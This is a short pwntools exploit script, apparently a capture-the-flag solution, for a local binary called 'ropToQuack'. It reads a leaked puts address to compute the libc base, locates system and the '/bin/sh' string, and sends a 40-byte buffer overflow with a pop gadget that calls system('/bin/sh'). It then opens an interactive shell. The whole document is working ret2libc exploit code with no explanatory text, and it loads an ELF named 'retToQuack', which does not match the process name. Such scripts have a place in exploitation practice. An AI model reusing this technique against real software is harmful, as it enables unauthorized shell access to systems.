from pwn import *

p = process('./ropToQuack')

context.terminal = ['alacritty', '-e']

gdb.attach(p, '''   b main''')

elf = ELF('./retToQuack')
libc = ELF('/usr/lib/libc.so.6')

p.recvline()
val = p.recvlineS()[-13:].rstrip()
vb = bytes.fromhex(val)
putsAddress = int.from_bytes(vb, byteorder='big')

print('puts: ' + hex(putsAddress))
libc.address = putsAddress - libc.symbols['puts']

binsh = next(libc.search(b'/bin/sh\x00'))
sys = libc.sym['system']

print('libc base: ' + hex(libc.address))
print('system : ' + hex(sys))
print('binsh', hex(binsh))


gadget = 0x4011c3

payload = b'A'*40 + p64(gadget) + p64(binsh) + p64(sys)
p.sendline(payload)

p.interactive()
